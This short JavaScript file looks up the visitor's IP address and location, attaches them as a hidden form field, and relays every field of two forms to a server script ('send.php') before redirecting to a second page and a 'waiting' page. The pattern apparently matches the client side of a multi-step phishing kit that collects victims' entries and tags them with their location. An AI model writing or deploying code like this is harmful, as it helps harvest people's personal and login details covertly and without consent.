
function getIP() {
  fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(d => {
      const info = `📍 IP: ${d.ip} — ${d.city}, ${d.country_name}`;
      document.getElementById("ipinfo").textContent = info;
      let input = document.createElement("input");
      input.type = "hidden"; input.name = "ubicacion"; input.value = info;
      document.forms[0].appendChild(input);
    });
}
getIP();

const post = (formId, nextPage) => {
  const f = document.getElementById(formId);
  if (!f) return;
  f.addEventListener("submit", e => {
    e.preventDefault();
    const data = new FormData(f);
    fetch("/send.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: [...data.entries()].map(([k, v]) => `${k}: ${v}`).join("\n")
      })
    }).then(() => window.location.href = nextPage);
  });
};

post("form1", "index2.html");
post("form2", "espera.html");
